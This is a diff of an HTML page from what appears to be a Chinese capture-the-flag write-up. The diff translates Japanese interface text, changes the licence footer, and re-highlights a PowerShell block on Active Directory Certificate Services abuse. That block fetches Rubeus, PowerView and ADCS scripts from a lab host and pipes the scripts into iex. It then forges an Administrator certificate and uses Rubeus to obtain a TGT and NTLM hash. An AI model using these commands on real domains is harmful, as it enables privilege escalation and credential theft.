@@ -154,7 +154,7 @@
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
                 <i class="icon icon-lg icon-chevron-left"></i>
             </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="検索">
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
             <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
                 <i class="icon icon-lg icon-search"></i>
             </a>
@@ -362,7 +362,7 @@
 <h1 id="ADCS"><a href="#ADCS" class="headerlink" title="ADCS"></a>ADCS</h1><ul>
 <li>cfalta/PoshADCS: A proof of concept on attack vectors against Active Directory by abusing Active Directory Certificate Services (ADCS)<br><a href="https://github.com/cfalta/PoshADCS" target="_blank" rel="noopener">https://github.com/cfalta/PoshADCS</a></li>
 </ul>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">curl http://<span class="number">10.10</span>.<span class="number">14.6</span>/Rubeus.exe -outfile \programdata\rubeus.exe</span><br><span class="line">curl http://<span class="number">10.10</span>.<span class="number">14.6</span>/PowerView.ps1 | iex</span><br><span class="line">curl http://<span class="number">10.10</span>.<span class="number">14.6</span>/ADCS.ps1 | iex</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成证书</span></span><br><span class="line">Get-SmartCardCertificate -Identity Administrator -TemplateName Web -NoSmartCard -Verbose</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取证书信息</span></span><br><span class="line">gci cert:\currentuser\my -recurse</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取TGT以及NTLM</span></span><br><span class="line">.\rubeus.exe asktgt /user:Administrator /getcredentials /certificate:<span class="number">1</span>C7115A30632E82A04A734179759756427247965</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>CCC18280610C6CA3156F995B5899E09</span><br></pre></td></tr></table></figure>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">curl http://<span class="number">10.10</span>.<span class="number">14.6</span>/Rubeus.exe <span class="literal">-outfile</span> \programdata\rubeus.exe</span><br><span class="line">curl http://<span class="number">10.10</span>.<span class="number">14.6</span>/PowerView.ps1 | iex</span><br><span class="line">curl http://<span class="number">10.10</span>.<span class="number">14.6</span>/ADCS.ps1 | iex</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成证书</span></span><br><span class="line"><span class="built_in">Get-SmartCardCertificate</span> <span class="literal">-Identity</span> Administrator <span class="literal">-TemplateName</span> Web <span class="literal">-NoSmartCard</span> <span class="literal">-Verbose</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取证书信息</span></span><br><span class="line">gci cert:\currentuser\my <span class="literal">-recurse</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取TGT以及NTLM</span></span><br><span class="line">.\rubeus.exe asktgt /user:Administrator /getcredentials /certificate:<span class="number">1</span>C7115A30632E82A04A734179759756427247965</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>CCC18280610C6CA3156F995B5899E09</span><br></pre></td></tr></table></figure>
 
 <h1 id="提权-amp-flags"><a href="#提权-amp-flags" class="headerlink" title="提权 &amp; flags"></a>提权 &amp; flags</h1><p>(基本整篇云的，当时做的时候用的非预期，现在参考预期云一遍)</p>
 <p>然后使用得到的hash PTH登录administrator：</p>
@@ -399,7 +399,7 @@
     <div class="content">
         
 <span class="post-time">
-    最終更新：<time datetime="2022-12-29T05:26:54.785Z" itemprop="dateUpdated">2022-12-29 13:26:54</time>
+    Last updated: <time datetime="2022-12-29T05:26:54.785Z" itemprop="dateUpdated">2022-12-29 13:26:54</time>
 </span><br>
 
 
@@ -566,7 +566,7 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>このブログの内容物は<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja" target="_blank">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
